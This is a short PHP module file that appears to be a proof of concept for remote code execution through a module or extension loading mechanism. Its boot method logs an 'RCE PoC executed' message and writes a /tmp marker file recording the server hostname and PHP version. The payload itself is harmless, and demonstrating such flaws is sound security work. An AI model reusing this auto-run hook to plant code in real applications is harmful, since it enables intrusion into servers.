<?php

namespace Modules\Rce\Demo;

use App\Extension\AbstractModule;
use Illuminate\Support\Facades\Log;

class Module extends AbstractModule
{
    public function boot()
    {
        parent::boot();
        Log::info("[RCE-DEMO] Module booting - RCE PoC executed!");
        $markerPath = "/tmp/g7_rce_poc_" . uniqid() . ".txt";
        $nonce = bin2hex(random_bytes(8));
        $content = "G7_RCE_POC_DEMONSTRATED: {$nonce}\nTimestamp: " . date("Y-m-d H:i:s") . "\nServer: " . gethostname() . "\nPHP Version: " . PHP_VERSION . "\n";
        file_put_contents($markerPath, $content);
        Log::info("[RCE-DEMO] Marker written: {$markerPath}");
    }

    public function register()
    {
        $this->registerConfig();
        $this->registerProviders();
    }
}
